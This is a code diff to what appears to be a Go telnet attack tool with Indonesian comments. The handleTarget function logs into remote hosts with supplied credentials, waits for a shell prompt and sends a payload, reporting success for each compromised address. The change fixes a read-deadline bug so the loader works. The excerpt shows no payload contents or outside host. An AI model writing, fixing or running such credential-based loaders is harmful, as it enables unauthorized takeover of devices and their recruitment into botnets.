@@ -61,27 +61,27 @@ func handleTarget(entry string) {
 
 	reader := bufio.NewReader(conn)
 
-	if !expectAny(reader, loginPrompts) {
+	if !expectAny(conn, reader, loginPrompts) {
 		return
 	}
 	conn.Write([]byte(auth[0] + "\n"))
 
-	if !expectAny(reader, passwordPrompts) {
+	if !expectAny(conn, reader, passwordPrompts) {
 		return
 	}
 	conn.Write([]byte(auth[1] + "\n"))
 
-	if !expectAny(reader, shellPrompts) {
+	if !expectAny(conn, reader, shellPrompts) {
 		return
 	}
 
-	// Hanya print jika berhasil login dan kirim payload
+	// Berhasil login dan kirim payload
 	println("[+] Success:", addr)
 	conn.Write([]byte(payload))
 	println("[*] Payload sent:", addr)
 }
 
-func expectAny(r *bufio.Reader, prompts []string) bool {
+func expectAny(conn net.Conn, r *bufio.Reader, prompts []string) bool {
 	buffer := ""
 	timeoutChan := time.After(timeout)
 
@@ -90,7 +90,7 @@ func expectAny(r *bufio.Reader, prompts []string) bool {
 		case <-timeoutChan:
 			return false
 		default:
-			r.SetReadDeadline(time.Now().Add(2 * time.Second))
+			conn.SetReadDeadline(time.Now().Add(2 * time.Second))
 			b, err := r.ReadByte()
 			if err != nil {
 				continue
